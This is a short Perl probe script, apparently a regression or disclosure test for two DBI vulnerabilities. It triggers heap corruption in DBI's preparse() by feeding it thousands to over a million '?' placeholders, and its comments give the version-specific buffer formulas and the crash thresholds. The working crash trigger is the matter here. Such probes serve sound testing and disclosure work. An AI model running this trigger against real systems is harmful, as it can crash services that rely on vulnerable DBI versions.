#!/usr/bin/env perl
# PCB probe for dbi-cve-2026-14739 (CVE-2026-10879 -> CVE-2026-14739).
#
# Exercises DBI's preparse() XS path with N '?' placeholders. The vulnerable
# code expands each '?' to ':p<idx>' into a buffer allocated as
# strlen(statement)*F + 16 (F=3 in <=1.647, F=6 in 1.648/1.649, F=7 plus a
# hard limit of 99999 in 1.650). When the expansion exceeds the buffer the
# process dies with SIGABRT/SIGSEGV (heap corruption).
#
# Usage: perl probe.pl <N>
#   N=5000      seed (CVE-2026-10879): crashes 1.647, safe on 1.648+
#   N=1200000   residual (CVE-2026-14739): crashes 1.648/1.649, clean error on 1.650
use strict;
use warnings;
use DBI ();

my $N = shift // 5000;
my $dbh = DBI->connect("dbi:ExampleP:", "", "") or die "connect failed: $DBI::errstr\n";
my $sql = "?" x $N;
my $out = $dbh->preparse($sql, 0x200, 0x100 | 0x200);   # ps_return=:pN, ps_accept='?'/':N'
if (defined $out) {
    print "ok len=", length($out), "\n";
}
else {
    print "preparse returned undef (limit exceeded)\n";
}
exit 0;
